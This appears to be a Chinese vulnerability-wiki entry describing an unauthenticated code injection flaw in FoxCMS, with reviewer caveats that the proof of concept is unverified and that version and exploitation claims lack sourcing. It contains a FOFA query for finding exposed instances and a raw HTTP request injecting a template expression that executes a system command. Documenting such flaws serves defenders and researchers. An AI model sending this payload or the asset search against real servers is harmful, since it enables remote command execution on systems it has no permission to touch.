---
fofa: ""
source: "SourByte05/Vulnerability-Wiki-PoC"
product: "FoxCMS"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
fofa_unverified: "body="
title: "FOXCMS黔狐内容管理系统 存在代码注入漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：images/index.html动态路由存在、id模板表达式被执行；文章称未认证"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-2887f60286ae67b89783cb6b"
entity_id: "ve-2887f60286ae67b89783cb6b"
schema_version: "1"
---

## 核对与使用边界

- 测绘字段处置：原 fofa 字段为残缺表达式、错误平台语法或当前解析器不支持的形式，原值完整保留到 fofa_unverified，不把它当作已校验查询或受影响资产证据。正文检索方法保留；具体问题见下列原审阅项。

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：images/index.html动态路由存在、id模板表达式被执行；文章称未认证

- **结论使用边界（1）**：frontmatter fofa仅body=，正文查询完整，抽取损坏。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **事实待核（2）**：版本仅产品名；在野利用已知、影响面广没有来源支持。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **事实待核（3）**：只有请求与截图，缺源码/明确补丁版本；与169同index.htmlRCE候选但CVE映射须核验。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

#   FOXCMS黔狐内容管理系统 存在代码注入漏洞

# 漏洞描述

FOXCMS黔狐内容管理系统 存在代码注入漏洞，未经身份验证的攻击者执行恶意命令导致服务器被控。

# 影响版本

FOXCMS黔狐内容管理系统

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

# 漏洞复现

FOFA：body="foxcms-logo" || body="foxcms-container"

```
GET /images/index.html?id=%24{%40print(system(%22pwd%22))} HTTP/1.1
Host: 127.0.0.1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9

```

![image-20250326192853665](./.resource/FOXCMS黔狐内容管理系统存在代码注入漏洞/media/image-20250326192853665.png)


# 漏洞修复

关闭互联网暴露面或接口设置访问权限

升级至安全版本


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
